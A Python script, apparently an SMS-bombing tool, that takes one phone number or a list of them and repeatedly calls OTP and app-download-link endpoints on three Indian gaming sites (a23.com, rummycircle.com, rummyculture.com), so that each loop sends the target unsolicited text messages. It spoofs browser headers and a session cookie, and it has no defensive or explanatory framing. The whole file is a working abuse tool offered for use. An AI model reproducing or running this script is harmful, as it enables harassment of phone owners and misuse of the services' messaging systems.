import json
import requests
import time

choice = int(input("1 enter number \n2 enter Number list \n Select an Option :"))
if choice == 1:
    num = input("Enter the mobile number: ")
    nums = [num]
elif choice == 2:
    file_name = input("Enter the name of text file: ")
    with open(file_name) as f:
        nums = f.readlines()
    nums = [x.strip() for x in nums]

req = int(input("Enter the number of requests to be sent: "))
delay=int(input("Enter the delay of second (1,2,3) :"))
headers = {
    "Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Origin": "https://www.a23.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.a23.com/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
    "Cookie": "gk-device-id=d63a1653-311c-455f-af75-1d2aa07596ea; _fbp=fb.1.1673762882375.1782639084; _gcl_au=1.1.68582690.1673762882; gk-interaction-id=7b2532c8-d4d5-498d-82f1-669d91314247; _ga=GA1.2.1241468689.1673762883; _gid=GA1.2.66916854.1673762883; _gat_UA-105018979-1=1; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU"
}

url1 = "https://pla23api.a23.com/PlatformService/support/sendApkLink"
data1 = {"channelFor":"APK","gameType":"A23Games"}

url2 = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
payload = {"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}

url3 = 'https://www.rummyculture.com/api/user/sendAppDownloadLink'
data = {}

for num in nums:
    data1["mobileNumber"] = num
    payload["mobile"] = num
    data["mobile"] = num
    for i in range(req):
        time.sleep(delay)
        response1 = requests.post(url1, headers=headers, json=data1)
        print(f"Response for {url1} with number {num} : {response1.status_code}")
        response2 = requests.post(url2, headers=headers, data=json.dumps(payload))
        print(f"Response for {url2} with number {num} : {response2.status_code}")
        response3 = requests.post(url3, headers=headers, json=data)
        print(f"Response for {url3} with number {num} : {response3.status_code}")

